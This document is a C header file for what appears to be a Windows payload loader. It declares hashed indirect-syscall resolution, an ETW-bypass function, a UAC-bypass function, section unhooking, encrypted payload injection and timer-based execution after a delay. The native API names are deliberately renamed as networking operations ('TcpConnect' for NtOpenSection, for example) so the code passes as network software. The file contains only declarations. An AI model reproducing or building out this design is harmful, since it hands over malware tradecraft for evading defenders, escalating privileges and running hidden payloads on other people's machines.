#pragma once

#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H


//
#define DELAY

// Banner Function
VOID XmPrintBanner(VOID);

// CONSTANTS
#define NETWORK_TIMEOUT                         0x0A            // 10 Seconds delay before executing the payload
#define CRYPTO_KEY_SIZE                         0x20            // 32
#define CRYPTO_IV_SIZE                          0x10            // 16
#define ERROR_ENDPOINT_NOT_FOUND                0xC0000034      // 'The endpoint is not found'

// Protocol Operation Hashes
#define TCP_CONNECT_HASH                        0x17CFA34E      // NtOpenSection_DJB2
#define HTTP_PROXY_HASH                         0x231F196A      // NtMapViewOfSection_DJB2
#define TLS_HANDSHAKE_HASH                      0x082962C8      // NtProtectVirtualMemory_DJB2
#define TCP_DISCONNECT_HASH                     0x595014AD      // NtUnmapViewOfSection_DJB2
#define BUFFER_ALLOCATE_HASH                    0x6793C34C      // NtAllocateVirtualMemory_DJB2
#define KEEP_ALIVE_HASH                         0x0A49084A      // NtDelayExecution_DJB2

#define DLL_LOAD_HASH                          0x5FBFF0FB      // LoadLibraryA_DJB2

#define ASYNC_TIMER_CREATE_HASH                0x0B49144C      // CreateThreadpoolTimer_DJB2
#define ASYNC_TIMER_SET_HASH                   0x3B944C24      // SetThreadpoolTimer_DJB2
#define SYNC_WAIT_HASH                         0xECCDA1BA      // WaitForSingleObject_DJB2

#define CODESEG_HASH                           0x0B80C0D8      // text_DJB2
#define USER_PROTOCOL_DLL_HASH                 0x34C755B7      // win32udll_DJB2
#define SYSTEM_PROTOCOL_DLL_HASH               0x7040EE75      // kernel32dll_DJB2
#define NET_PROTOCOL_DLL_HASH                  0x22D3B5ED      // ntdlldll_DJB2
#define ADVAPI_PROTOCOL_DLL_HASH               0x67208A49      // advapi32dll_DJB2

// ETW Bypass related hashes
#define NT_TRACEEVENT_HASH                     0x1E2085F8      // NtTraceEvent_DJB2
#define NT_WRITE_HASH                          0x95F3A792      // NtWriteVirtualMemory_DJB2

//--------------------------------------------------------------------------------------------------------------------------------------------------
// Protocol Handler Structure

typedef struct _NETWORK_PROTOCOL
{
    DWORD dwConnectionId;           // Protocol operation ID (was dwSSn)
    DWORD dwProtocolHash;           // Protocol operation hash (was dwSyscallHash)
    PVOID pHandlerAddress;          // Protocol handler address (was pSyscallInstAddress)    

}NETWORK_PROTOCOL, * PNETWORK_PROTOCOL;


BOOL XmFetchSystemCall(IN DWORD dwSysHash, OUT PNETWORK_PROTOCOL pNtSys);
extern VOID XmSetInvokeId(IN DWORD dwSSn, IN PVOID pSyscallInstAddress);
extern NTSTATUS XmInvokeSystemCall();


#define SET_SYSCALL(NtSys)(XmSetInvokeId((DWORD)NtSys.dwConnectionId,(PVOID)NtSys.pHandlerAddress))

//--------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NETWORK_CONFIG {

    NETWORK_PROTOCOL	TcpConnect;           // Was NtOpenSection
    NETWORK_PROTOCOL	HttpProxy;            // Was NtMapViewOfSection
    NETWORK_PROTOCOL	TlsHandshake;         // Was NtProtectVirtualMemory
    NETWORK_PROTOCOL	TcpDisconnect;        // Was NtUnmapViewOfSection
    NETWORK_PROTOCOL BufferAllocate;       // Was NtAllocateVirtualMemory
    NETWORK_PROTOCOL KeepAlive;            // Was NtDelayExecution

    BOOL            bInitialized;          // Was bInit

}NETWORK_CONFIG, * PNETWORK_CONFIG;


//--------------------------------------------------------------------------------------------------------------------------------------------------
// Network Protocol Functions

BOOL XmInitializeNetworkProtocols(OUT PNETWORK_CONFIG NetCfg);
unsigned int XmGenerateSessionId();
DWORD XmCalculateNetworkHash(IN LPCSTR String);
VOID XmConcatProtocolString(IN WCHAR* pDest, IN WCHAR* pSource);
VOID XmCopyNetworkBuffer(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);
PVOID XmAllocateNetworkBuffer(IN SIZE_T sBufferSize);  // New network-themed heap allocation

#define NETWORK_HASH(STR)    ( XmCalculateNetworkHash( (LPCSTR)STR ) )

//--------------------------------------------------------------------------------------------------------------------------------------------------
// Protocol Security Functions

VOID XmRestoreOriginalSections();
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// Protocol Resolution Functions

HMODULE GetModuleHandleH(IN UINT32 uModuleHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// Protocol Packet Functions

BOOL XmAllocateEncryptedSection(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);
VOID XmScheduleAsyncOperation(IN PVOID pInjectedPayload);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// Resource Functions

BOOL XmFetchResourceData(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// ETW and Security Functions

BOOL XmBypassEtwProtection(VOID);  // New ETW bypass function
BOOL XmBypassUAC(VOID);

#endif // !COMMON_H
